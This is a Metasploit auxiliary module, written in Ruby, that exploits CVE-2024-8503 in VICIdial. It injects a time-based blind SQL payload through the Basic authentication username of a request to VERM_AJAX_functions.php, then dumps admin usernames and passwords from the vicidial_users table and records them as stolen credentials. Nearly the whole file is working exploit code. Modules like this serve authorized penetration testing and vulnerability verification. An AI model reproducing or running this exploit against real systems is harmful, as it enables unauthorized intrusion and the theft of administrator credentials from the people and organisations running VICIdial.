##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Vicidial SQL Injection Time-based Admin Credentials Enumeration',
        'Description' => %q{
          This module exploits a time-based SQL injection vulnerability in VICIdial, allowing attackers
          to dump admin credentials (usernames and passwords) via SQL injection.
        },
        'Author' => [
          'Valentin Lobstein',              # Metasploit Module
          'Jaggar Henry of KoreLogic, Inc.' # Vulnerability Discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt'],
          ['CVE', '2024-8503']
        ],
        'DisclosureDate' => '2024-09-10',
        'DefaultOptions' => {
          'SqliDelay' => 1,
          'VERBOSE' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path of the VICIdial instance', '/']),
        OptInt.new('COUNT', [true, 'Number of records to dump', 1])
      ]
    )
  end

  def run
    print_status('Checking if target is vulnerable...')

    setup_sqli
    return print_error('Target is not vulnerable.') unless @sqli.test_vulnerable

    print_good('Target is vulnerable to SQL injection.')

    columns = ['User', 'Pass']
    data = @sqli.dump_table_fields('vicidial_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'vicidial_users', 'Indent' => 4, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :password,
        private_data: user[1],
        service_name: 'VICIdial',
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good('Dumped table contents:')
    print_line(table.to_s)
  end

  def setup_sqli
    @sqli = create_sqli(
      dbms: MySQLi::TimeBasedBlind,
      opts: { hex_encode_strings: true }
    ) do |payload|
      random_username = Rex::Text.rand_text_alphanumeric(6, 8)
      random_password = Rex::Text.rand_text_alphanumeric(6, 8)

      username = "#{random_username}', '', (#{payload}));# "
      credentials = "#{username}:#{random_password}"
      credentials_base64 = Rex::Text.encode_base64(credentials)

      send_request_cgi({
        'uri' => normalize_uri(datastore['TARGETURI'], 'VERM', 'VERM_AJAX_functions.php'),
        'vars_get' => { 'function' => 'log_custom_report' },
        'headers' => {
          'Authorization' => "Basic #{credentials_base64}"
        }
      })
    end
  end
end
